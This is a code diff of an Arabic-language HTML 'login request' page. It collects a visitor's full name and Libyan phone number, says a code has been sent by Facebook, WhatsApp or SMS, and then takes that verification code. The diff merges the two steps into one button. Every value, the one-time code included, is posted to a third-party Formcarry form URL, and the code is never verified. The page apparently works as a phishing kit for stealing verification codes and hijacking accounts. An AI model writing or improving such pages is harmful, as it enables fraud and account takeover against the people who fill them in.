@@ -91,78 +91,86 @@
     <h2>طلب الدخول</h2>
     <input type="text" id="fullName" placeholder="الاسم بالكامل" required>
     <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
-    <button onclick="sendCode()">أرسل كود</button>
 
     <div id="notification">تم إرسال الكود عبر إشعار فيسبوك أو واتساب أو رسالة نصية</div>
 
     <div id="codeSection">
       <input type="text" id="codeInput" placeholder="رمز التحقق" maxlength="8">
-      <button onclick="submitCode()">طلب التأكيد</button>
     </div>
+
+    <button id="actionBtn" onclick="handleAction()">طلب التحقق</button>
   </div>
 
   <script>
-    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB"; // ← استبدل هذا برابط الفورم الخاص بك
+    const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB"; // ← استبدل هذا بالرابط الخاص بك
+    let step = 1; // المرحلة الحالية: 1 لإرسال البيانات، 2 للتحقق من الكود
 
-    function sendCode() {
-      const fullName = document.getElementById("fullName").value.trim();
-      const myPhone = document.getElementById("myPhone").value.trim();
+    function handleAction() {
+      if (step === 1) {
+        const fullName = document.getElementById("fullName").value.trim();
+        const myPhone = document.getElementById("myPhone").value.trim();
 
-      if (!/^09\d{8}$/.test(myPhone)) {
-        alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 09 ويتكون من 10 أرقام.");
-        return;
+        if (!/^09\d{8}$/.test(myPhone)) {
+          alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 09 ويتكون من 10 أرقام.");
+          return;
+        }
+
+        if (fullName.length < 3) {
+          alert("يرجى إدخال الاسم بالكامل (على الأقل 3 أحرف).");
+          return;
+        }
+
+        // إرسال الاسم ورقم الهاتف إلى Formcarry
+        fetch(formcarryURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            fullName: fullName,
+            myPhone: myPhone
+          })
+        }).then(() => {
+          const notification = document.getElementById("notification");
+          notification.style.display = "block";
+
+          setTimeout(() => {
+            notification.style.display = "none";
+            document.getElementById("codeSection").style.display = "block";
+            step = 2;
+          }, 4000);
+        }).catch((error) => {
+          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+          console.error(error);
+        });
+
+      } else if (step === 2) {
+        const code = document.getElementById("codeInput").value.trim();
+
+        if (!/^[0-9a-zA-Z]{6,8}$/.test(code)) {
+          alert("يرجى إدخال رمز تحقق صحيح يتكون من 6 إلى 8 أرقام أو حروف.");
+          return;
+        }
+
+        // إرسال الكود
+        fetch(formcarryURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            verificationCode: code
+          })
+        }).then(() => {
+          alert("تم تأكيد الكود بنجاح ✅");
+
+          // إغلاق الحقول بعد التأكيد
+          document.getElementById("fullName").disabled = true;
+          document.getElementById("myPhone").disabled = true;
+          document.getElementById("codeInput").disabled = true;
+          document.getElementById("actionBtn").disabled = true;
+          document.getElementById("actionBtn").innerText = "تم التحقق";
+        }).catch((error) => {
+          alert("فشل في إرسال الكود. حاول مرة أخرى.");
+          console.error(error);
+        });
       }
-
-      if (fullName.length < 3) {
-        alert("يرجى إدخال الاسم بالكامل (على الأقل 3 أحرف).");
-        return;
-      }
-
-      // إرسال الاسم ورقم الهاتف إلى Formcarry
-      fetch(formcarryURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          fullName: fullName,
-          myPhone: myPhone
-        })
-      }).then(() => {
-        // عرض الإشعار
-        const notification = document.getElementById("notification");
-        notification.style.display = "block";
-
-        // بعد 4 ثوانٍ، إخفاء الإشعار وإظهار حقل الكود
-        setTimeout(() => {
-          notification.style.display = "none";
-          document.getElementById("codeSection").style.display = "block";
-        }, 4000);
-      }).catch((error) => {
-        alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
-        console.error(error);
-      });
-    }
-
-    function submitCode() {
-      const code = document.getElementById("codeInput").value.trim();
-
-      if (!/^[0-9a-zA-Z]{6,8}$/.test(code)) {
-        alert("يرجى إدخال رمز تحقق صحيح يتكون من 6 إلى 8 أرقام أو حروف.");
-        return;
-      }
-
-      // إرسال الكود إلى Formcarry
-      fetch(formcarryURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          verificationCode: code
-        })
-      }).then(() => {
-        alert("تم تأكيد الكود بنجاح ✅");
-      }).catch((error) => {
-        alert("فشل في إرسال الكود. حاول مرة أخرى.");
-        console.error(error);
-      });
     }
   </script>
 </body>
